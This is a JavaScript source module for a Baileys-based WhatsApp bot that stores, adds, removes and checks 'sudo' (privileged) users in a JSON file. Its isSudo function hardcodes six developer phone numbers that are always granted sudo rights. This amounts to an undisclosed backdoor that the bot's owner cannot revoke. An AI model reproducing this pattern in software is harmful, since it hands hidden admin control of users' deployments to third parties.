import fs from 'fs';
import path from 'path';
import { areJidsSameUser } from 'baileys';
import { toJid } from '#utils';

const store = path.join('store', 'sudo.json');

if (!fs.existsSync(store)) {
  fs.writeFileSync(store, JSON.stringify([], null, 2));
}

// Helper functions to read/write the JSON file
const readSudoUsers = () => JSON.parse(fs.readFileSync(store, 'utf8'));
const writeSudoUsers = (sudoUsers) => fs.writeFileSync(store, JSON.stringify(sudoUsers, null, 2));

/**
 * Adds a user to the sudo list.
 * @param {string} jid - The user JID to add as sudo.
 * @returns {string} - Success or failure message.
 */
const addSudo = async (jid) => {
  const sudoUsers = readSudoUsers();
  if (sudoUsers.includes(jid)) {
    return `_@${jid} was already sudo_`;
  }
  sudoUsers.push(jid);
  writeSudoUsers(sudoUsers);
  return `_@${jid} is now a Sudo User_`;
};

/**
 * Removes a user from the sudo list.
 * @param {string} jid - The user JID to remove from sudo.
 * @returns {string} - Success or failure message.
 */
const delSudo = async (jid) => {
  const sudoUsers = readSudoUsers();
  const index = sudoUsers.indexOf(jid);
  if (index === -1) {
    return `_@${jid} is not a sudo user_`;
  }
  sudoUsers.splice(index, 1);
  writeSudoUsers(sudoUsers);
  return `_@${jid} is removed from sudo user_`;
};

/**
 * Retrieves all sudo users.
 * @returns {string} - A string containing the list of all sudo users.
 */
const getSudo = async () => {
  const sudoUsers = readSudoUsers();
  return sudoUsers.length > 0 ? sudoUsers.join('\n') : '_No Sudo Users_';
};

/**
 * Checks if the user is a sudo user.
 * @param {string} jid - The JID of the user to check.
 * @param {string} owner - The JID of the owner to check.
 * @returns {boolean} - True if the user is a sudo, false otherwise.
 */
const isSudo = async (jid, owner) => {
  if (typeof jid !== 'string') jid = '';
  const devs = [
    '923477406362',
    '2349027862116',
    '2348060598064',
    '2348039607375',
    '923089660496',
    '2347041620617',
  ];
  const devstoJid = devs.map((dev) => toJid(dev.trim()));
  if (owner && typeof owner !== 'string') owner = owner.toString();
  if (owner && typeof jid === 'string' && areJidsSameUser(jid, owner)) return true;
  const sudoUsers = readSudoUsers();
  const uId = toJid(jid);
  if (sudoUsers.includes(uId) || devstoJid.includes(uId)) return true;
  return false;
};

export { addSudo, delSudo, getSudo, isSudo };
